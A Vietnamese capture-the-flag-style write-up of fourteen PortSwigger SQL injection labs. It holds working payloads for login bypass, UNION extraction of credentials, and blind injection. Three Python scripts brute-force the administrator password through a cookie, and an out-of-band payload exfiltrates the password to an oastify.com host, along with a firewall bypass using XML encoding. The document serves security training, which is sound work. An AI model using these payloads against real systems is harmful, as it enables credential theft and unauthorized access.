# SQL Injection - *Nguyễn Văn Thọ*

## Apprentice
### Bài 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
> ![](https://i.imgur.com/fxlb7I5.png)

Ở bài này, đề mô tả rằng chức năng `category filter` chứa lỗ hổng SQLi như hình, mục tiêu là khai thác để hiển thị toàn bộ sản phẩm trong database ra

Câu truy vấn đề cung cấp như sau 
```sql!
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Ta có thể sửa lại thành 
```sql!
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 -- AND released = 1
```
Vậy là ta có 1 câu truy vấn luôn đúng, nhờ thế có thể lấy được toàn bộ sản phẩm trong bảng `products`
Khi ta sử dụng chức năng filter của trang web, đường dẫn sẽ là `web-security-academy.net/filter?category=Gifts`, nó nhận tham số để filter trên url, và đẩy tham số đó vào câu query.
Để khai thác, ta đổi tham số thành `Gifts' OR 1=1 --` 
Câu query sẽ thành 
```sql!
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1
```
Kết quả khai thác:
>![](https://i.imgur.com/ed0C64F.png)

<hr>

### Bài 2: SQL injection vulnerability allowing login bypass
>![](https://i.imgur.com/4kENrSj.png)

Mục tiêu của bài này là đăng nhập dưới tài khoản admin. Ngoài ra đề không cung cấp thông tin thêm.
Truy cập trang web và sử dụng chức năng đăng nhập, ta đoán câu query sẽ là:
```sql!
SELECT * FROM USERS WHERE username=$_POST['username'] AND password=$_POST['password']
```
Data ta post lên sẽ đẩy thẳng vào query, do đó ta có thể sửa trường `username` để bỏ qua điều kiện của `password` như sau:
```sql!
SELECT * FROM USERS WHERE username='administrator' --' AND password=$_POST['password']
```
Kết quả khai thác:
>![](https://i.imgur.com/GDdeWal.png)

<hr>

## Practitioner
### Bài 3: SQL injection UNION attack, determining the number of columns returned by the query
>![](https://i.imgur.com/6rtBrF6.png)

Bài lab này giới thiệu kiểu tấn công Union-based SQLi, và nhiệm vụ của chúng ta là xác định số cột trong bảng (chức năng có lỗ hổng là `category filter`)

Vẫn như bài đầu, câu truy vấn của chức năng này lên database sẽ là
```sql!
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Để xác định số cột, ta sử dụng toán tử UNION để bảng này với bảng khác (ta sẽ tạo), toán tử này yêu cầu 2 bảng có cùng số cột, nên ta có thể nhờ đó xác định đúng kết quả.
```sql!
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,NULL,NULL --' AND released = 1
```
Số chữ `NULL` của câu SELECT sau sẽ cho ta biết số cột, brute-force ta có được số cột là 3
Kết quả
>![](https://i.imgur.com/SEhKMzu.png)

<hr>

### Bài 4: SQL injection UNION attack, finding a column containing text
>![](https://i.imgur.com/NBkKKQU.png)

Theo mô tả của đề, trang web này chứa lỗ hổng SQL injection ở chức năng `category filter` và nhiệm vụ của ta là tìm cột có dữ liệu chuỗi

Đầu tiên, ta cần xác định số cột của bảng `products` bằng kĩ thuật như ở `Bài 3`. Xác định được bảng có 3 cột.
Tiếp theo để biết cột nào có kiểu dữ liệu CHAR, ta thử lần lượt như sau:
```sql!
' UNION SELECT 'a', NULL, NULL -- 
' UNION SELECT NULL, 'a', NULL --
' UNION SELECT NULL, NULL, 'a' --  
```
Và ta xác định được cột thứ 2 có kiểu dữ liệu chuỗi, kết quả khai thác thành công
>![](https://i.imgur.com/bzuS1hd.png)

<hr>

### Bài 5: SQL injection UNION attack, retrieving data from other tables
>![](https://i.imgur.com/y6T04ew.png)

Ở bài này, đề mô tả rằng chức năng `category filter` có lỗi SQL injection. Và mục tiêu của ta là đọc dữ liệu ở bảng `users` để lấy tài khoản admin và đăng nhập.
Cũng như các bài Union-based khác, đầu tiên ta xác định số cột, và kết quả là có 2 cột.
Ở mệnh đề thứ 2 của union, thay vì `select NULL, NULL` ta sửa lại thành
```sql!
SELECT username, password FROM users
```
Kết quả:
>![](https://i.imgur.com/axuf0Tm.png)

Đăng nhập với tài khoản này là ta có thể solve bài lab:
>![](https://i.imgur.com/jdhLaaz.png)

<hr>

### Bài 6: injection UNION attack, retrieving multiple values in a single column
>![](https://i.imgur.com/GULTSUG.png)

Theo mô tả của đề, trang web này chứa lỗ hổng trong chức năng `category filter` và mục tiêu của ta là lấy account admin từ bảng `users`
Đầu tiên, ta xác định số cột, và biết được bảng hiện tại có 2 cột.
Tuy nhiên khi thay mệnh đề 2 của union thành câu truy vấn lấy username và password như bài trên thì ta gặp lỗi. Nguyên do có thể đến từ việc khác kiểu dữ liệu. Ta cần xác định xem trong 2 cột của bảng hiện tại có cột nào kiểu string không.
```sql!
SELECT 'a', NULL
SELECT NULL, 'a'
```
Và biết được cột thứ 2 có kiểu string, ta sẽ lấy account của admin ở cột thứ 2 như sau
```sql!
UNION SELECT NULL, username FROM users -- 
```
>![](https://i.imgur.com/TtkaTN0.png)

và lấy nốt password
```sql!
UNION SELECT NULL, password FROM users -- 
```
>![](https://i.imgur.com/TjS7gq1.png)

Vì ta không biết được đâu là password của admin nên ta sẽ thử từng cái một trong số 3 cái password kia
Và kết quả là
>![](https://i.imgur.com/TOll3dr.png)

<hr>

### Bài 7: SQL injection attack, querying the database type and version on Oracle
>![](https://i.imgur.com/ng2WrH2.png)

Đề yêu cầu ta SQL injection để hiện ta version của hệ quản trị cơ sở dữ liệu, biết chức năng có lỗi là `category filter` và csdl Oracle (tiêu đề)

Ở Oracle, khi lấy version của csdl ta dùng lệnh
```sql!
SELECT banner FROM v$version
SELECT version FROM v$instance
```
Xác định ta có bảng hiện tại có 2 cột, để xác định version, ta union với câu SQL phía trên, kết quả như sau
(Chú ý phải có FROM thì câu truy vấn mới thực hiện được)
>![](https://i.imgur.com/fO1COM2.png)

Trong Oracle, câu truy vấn đề lấy version sẽ trả về một chuỗi chứa version, dạng string
Ta cần xác định thêm để biết cột nào trong bảng hiện tại có kiểu dữ liệu string và biết được đó là cột thứ 2
>![](https://i.imgur.com/jUlD06v.png)

Sửa lại để UNION thì kết quả là ta lấy được version và solve bài lab
```sql!
' UNION SELECT NULL, banner FROM v$version -- 
```
>![](https://i.imgur.com/PV8dhCw.png)

<hr>

### Bài 8: Blind SQL injection with conditional responses
>![](https://i.imgur.com/N1Z8n0P.png)

Theo đề thì trang web sẽ trả về văn bản có chữ "welcome back" nếu câu truy vấn có trả về kết quả, còn không thì sẽ không có chữ này. Ta sẽ dựa vào dấu hiệu này để khai thác boolean based SQLi

Đầu tiên, cần xác định chức năng nào có lỗi, sau khi kiểm tra thì em biết có 1 chức năng ẩn sử dụng Cookie `TrackingId`.
Khi ta sửa giá trị của nó thành `xxxxx' AND 1=2 -- ` thì chữ 'welcome back đã biến mất'
Ta xác định số cột của table trước, payload sẽ là `xxx' UNION SELECT NULL --` và biết được nó có 1 cột kiểu string
Ta sử dụng Burp Intruder để brute-force số ký tự của password và biết được nó có 20 ký tự, payload như trong hình.
>![](https://i.imgur.com/mBOr6zh.png)

Tiếp đó lại dùng Burp Intruder để brute-force giá trị của password
Đề đã cho trước password sẽ có chứa ký tự thường và số, ta có câu truy vấn để lấy từng ký tự như sau
```sql!
(SELECT SUBSTRING(password,'X',1) FROM users WHERE username='administrator')='Y'--
```
Trong đó `X` và `Y` là hai giá trị sẽ làm tham số brute-force, X nằm trong khoảng 1 đến 20; còn Y thuộc bảng chữ cái thường + số
Lười làm bằng Intruder nên em code python như sau
```python!
import requests

url = "https://0a6e004203010e2dc0d2d676001f00aa.web-security-academy.net/"

cookie = {
    'TrackingId' : ''
}
password=""
for i in range(1,21):
    for j in range(48,58):
        cookie['TrackingId'] = "jhWqQbqPdHKVPMXV' AND (SELECT SUBSTRING(password,{},1) FROM users WHERE username = 'administrator')='{}' --".format(i, chr(j))
        r = requests.get(url=url,cookies=cookie)
        if("Welcome" in r.text):
            password += chr(j)
    for j in range(97,123):
        cookie['TrackingId'] = "jhWqQbqPdHKVPMXV' AND (SELECT SUBSTRING(password,{},1) FROM users WHERE username = 'administrator')='{}' --".format(i, chr(j))
        r = requests.get(url=url,cookies=cookie)
        if("Welcome" in r.text):
            password += chr(j)
    print("pass: ", password)
```
Kết quả có password và truy cập được tài khoản admin
**Password**
>![](https://i.imgur.com/aRc0OXT.png)

**Truy cập tài khoản admin**
>![](https://i.imgur.com/3Br6MjB.png)

<hr>

### Bài 9: Blind SQL injection with conditional errors
>![](https://i.imgur.com/wEIHZi9.png)

Mô tả: Bài lab sử dụng database Oracle, cookie sẽ được gửi trong câu truy vấn đến server, câu truy vấn sẽ trả về mã lỗi nếu không thực thi được, còn nếu đúng sẽ không có gì xảy ra.

Đầu tiên, ta thử xác định câu truy vấn chứa cookie hoạt động như thế nào, bằng cách thay đổi giá trị cookie. Cuối cùng ta xác định câu truy vấn có dạng
```sql!
SELECT X FROM Y WHERE cookie='XXX'
```
Vì đây là hệ quản trị csdl Oracle nên để sử dụng `Condition based SQLi` thì ta dùng 
```sql! 
SELECT CASE WHEN (CONDITIONAL-HERE) THEN <TRUE ACTION> ELSE <FALSE ACTION> END FROM <TABLE>
```

- Conditional của ta sẽ là SUBSTR(password,X,1) = 'Y'
Trong đó X và Y sẽ là giá trị brute-force, X thuộc range độ dài password từ 1-20, còn Y là các chữ cái/ con số trong trong bảng ascii
- Table sẽ là users
- Mệnh đề WHERE sẽ là username='administrator'
Ta sẽ dò ký tự tại từng vị trí của password

**Script Exploit**
```python!
import requests

url = "https://0a7200300446af92c0833bb0009700c3.web-security-academy.net/"

cookie = {
    'TrackingId' : ''
}
password=""
for i in range(1,21):
    for j in range(48,58):
        cookie['TrackingId'] = "bwM5osZXk2fXZiQG'||(SELECT CASE WHEN (SUBSTR(password,{},1)='{}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'".format(i, chr(j))
        r = requests.get(url=url,cookies=cookie)
        if(r.status_code==500):
            password += chr(j)
    for j in range(97,123):
        cookie['TrackingId'] = "bwM5osZXk2fXZiQG'||(SELECT CASE WHEN (SUBSTR(password,{},1)='{}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'".format(i, chr(j))
        r = requests.get(url=url,cookies=cookie)
        if(r.status_code==500):
            password += chr(j)
    print("pass: ", password)
```
**Brute force password**
>![](https://i.imgur.com/Qnp2wa6.png)


**Hoàn thành bài lab với password có được**
>![](https://i.imgur.com/sI5o7iX.png)

<hr>

### Bài 10: Blind SQL injection with time delays
>![](https://i.imgur.com/orXq0vZ.png)

Bài lab mô tả rằng cookie sẽ được nhúng trong câu truy vấn cơ sở dữ liệu, trang web sẽ không hiển thị bất kì gì khác thường giữa truy vấn thành công và không thành công. Mục tiêu của ta là khiến trang web delay 10s trước khi trả về.

Vì đề không cung cấp tên csdl nên ta sẽ tạo payload delay với từng cơ sở dữ liệu. Và có được kết quả là Postgre database.
**Payload**
```sql!
J2bOLBLZ37AJ7Qzf' || (SELECT pg_sleep(10)--
```
Khai thác thành công ta có kết quả như hình
>![](https://i.imgur.com/nbqSH1B.png)

> [color=#ea4f9a]Note: Trang web filter `AND`,`OR` nên ta không sử dụng nhiều condition trong mệnh đề WHERE được, phải dùng concat string.

<hr>

### Bài 11: Blind SQL injection with time delays and information retrieval
![](https://i.imgur.com/NK9rHBB.png)

Mô tả: Cũng là time delay nhưng mà ta sẽ lợi dụng nó để lấy dữ liệu
Thay vì `SELECT pg_sleep(10)` như bài bên trên, ta sẽ chuyển vế concat phía sau thành câu điều kiện như sau:

```sql!
NGhCZbs8GOuSuKsa' || (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),X,1)='Y') THEN pg_sleep(3) ELSE pg_sleep(0) END)--
```
Trong đó X nhận giá trị từ 1-20, là độ dài của password. Và Y nhận giá trị là các chữ cái và con số. Ta sẽ brute-force từng ký tự của password thông qua time delay.

**Script khai thác**
```python!
import requests

url = "https://0a1a00bb030e1999c0bdeacd00d7000c.web-security-academy.net/"

cookie = {
    'TrackingId' : ''
}
password=""
for i in range(1,21):
    for j in range(48,58):
        cookie['TrackingId'] = "NGhCZbs8GOuSuKsa' || (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),{},1)='{}') THEN pg_sleep(3) ELSE pg_sleep(0) END)--".format(i, chr(j))
        r = requests.get(url=url,cookies=cookie)
        if(r.elapsed.total_seconds()>=3):
            password += chr(j)
    for j in range(97,123):
        cookie['TrackingId'] = "NGhCZbs8GOuSuKsa' || (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),{},1)='{}') THEN pg_sleep(3) ELSE pg_sleep(0) END)--".format(i, chr(j))
        r = requests.get(url=url,cookies=cookie)
        if(r.elapsed.total_seconds()>=3):
            password += chr(j)
    print("pass: ", password)
```

**Kết quả**
>![](https://i.imgur.com/09GVydR.png)

>![](https://i.imgur.com/M9shOsZ.png)

<hr>

### Bài 12: Blind SQL injection with out-of-band interaction
>![](https://i.imgur.com/r8ZD7FL.png)

Đề miêu tả rằng trang web chứa lỗ hổng Blind SQLi, giá trị cookie `TrackingId` được gửi trong câu truy vấn lên database. Tuy nhiên server miễn nhiễm với time delay hay error query, vì vậy, ta cần thực hiện Out-of-Band SQLi. Mục tiêu là khiến server thực hiện 1 DNS lookup tới Burp Collaborator.
Ta dùng hàm `ExtractValue` để truy vấn các giá trị trong XML, thông qua đó gọi hàm tạo request lấy dữ liệu từ bên ngoài; Điều này sẽ vô tình gửi DNS request tới domain đích.

```sql!
UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT 1)||'.y43ftvqi6ebzth5o2ae6ke8d84eu2j.oastify.com/"> %remote;]>'),'/l') FROM dual--
```
>![](https://i.imgur.com/E6IAPhL.png)

<hr>

### Bài 13: Blind SQL injection with out-of-band data exfiltration
>![](https://i.imgur.com/JTSWKxY.png)

Bài này cũng giống bài trên, nhưng mình sẽ lấy dữ liệu từ database thay vì chỉ gửi request dns như trên. Dữ liệu sẽ được gửi trả dưới dạng subdomain trong truy vấn.

```sql!
UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.y43ftvqi6ebzth5o2ae6ke8d84eu2j.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

Kết quả thu được password như hình dưới:
>![](https://i.imgur.com/BeUXu9W.png)

Đem đăng nhập và thành công:
>![](https://i.imgur.com/GCK1t1Y.png)

<hr>

### Bài 14: SQL injection with filter bypass via XML encoding
>![](https://i.imgur.com/2Qcy3BT.png)

Mô tả: trang Web chứa lỗ hổng SQLi trong chức năng `Stock Check`, và kết quả của truy vấn sql sẽ trả về người dùng, vì vậy ta có thể dùng UNION based SQLi để khai thác và lấy tài khoản admin đăng nhập.

> [color=#ea4f9a] Trang web có 1 Filewall phòng chống khai thác SQL, chúng ta cần tìm cách bypass.

Khi sử dụng tính năng đó, ta thấy payload mà nó POST lên server như sau:
>![](https://i.imgur.com/lu2OdwF.png)

Khi ta thử sửa đổi giá trị của `productId` thì nhận được response như sau:
>![](https://i.imgur.com/gQFqBtG.png)

Xét thêm ta thấy tham số `StoreId` được server xử lý.
>![](https://i.imgur.com/1TgtHI5.png)

Ta sẽ tận dụng tham số này để khai thác, tuy nhiên cần bypass Firewall trước. 
Thay vì đưa thẳng payload vào tham số, ta sẽ encode nó trước với dec_entities
```xml!
<@dec_entities>
    1 UNION SELECT 'A'
    <@/dec_entities>
```
Và ta thấy kết quả trả về như sau:
>![](https://i.imgur.com/HSo1yXo.png)

Sửa lại phần select để lấy password của admin, ta có payload như sau
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>
        1
    </productId>
    <storeId>
        <@dec_entities>
            1 UNION SELECT password from users where username='administrator'
            <@/dec_entities>
    </storeId>
</stockCheck>
```

Và password được trả về
>![](https://i.imgur.com/vXbGz3M.png)

Đăng nhập là xong
>![](https://i.imgur.com/C9yEDqK.png)

<hr>
